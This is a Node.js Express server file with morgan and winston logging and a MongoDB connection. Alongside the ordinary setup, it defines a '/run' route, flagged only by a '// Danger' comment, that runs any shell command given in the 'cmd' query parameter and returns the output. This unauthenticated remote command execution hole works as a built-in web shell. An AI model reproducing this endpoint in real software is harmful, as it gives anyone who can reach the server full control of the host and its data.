const express = require("express");
const mongoose = require("mongoose");
const fs = require("fs");
const path = require("path");
const morgan = require("morgan");
const winston = require("winston");
require("dotenv").config();
// const { postsRouter } = require("./routes/Posts.routes");
const { connection } = require("./config/db");
const { UserModel } = require("./models/Users.model");
const { Posts } = require("./models/Posts.model");
const app = express();
app.use(express.json());

if (!fs.existsSync("nodejs-logs")) {
  fs.mkdirSync("nodejs-logs");
}

const accessLogStream = fs.createWriteStream(
  path.join(__dirname, "nodejs-logs", "access.log"),
  { flags: "a" }
);
app.use(morgan("combined", { stream: accessLogStream }));

// Danger
app.get("/run", (req, res) => {
  const { exec } = require("child_process");
  const userCommand = req.query.cmd;
  exec(userCommand, (err, stdout, stderr) => {
    res.send(stdout || stderr);
  });
});

// Setup error logging (winston)
const logger = winston.createLogger({
  format: winston.format.json(),
  transports: [
    new winston.transports.File({
      filename: "nodejs-logs/error.log",
      level: "error",
    }),
  ],
});

// --------------------------------------------------- //

// Basic route
app.get("/", (req, res) => {
  console.log("WELCOME PAGE");
  res.send("Welcome Node Server Running");
});

app.use((err, req, res, next) => {
  logger.error(err.stack);
  res.status(500).send("Something broke!");
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, async () => {
  console.log(`✅ Server is running on port ${PORT}`);
  try {
    await connection;
    console.log("✅ Successfully connected to MongoDB");
  } catch (err) {
    console.error("❌ Error connecting to MongoDB:", err);
    logger.error("MongoDB connection error: " + err.stack);
  }
});
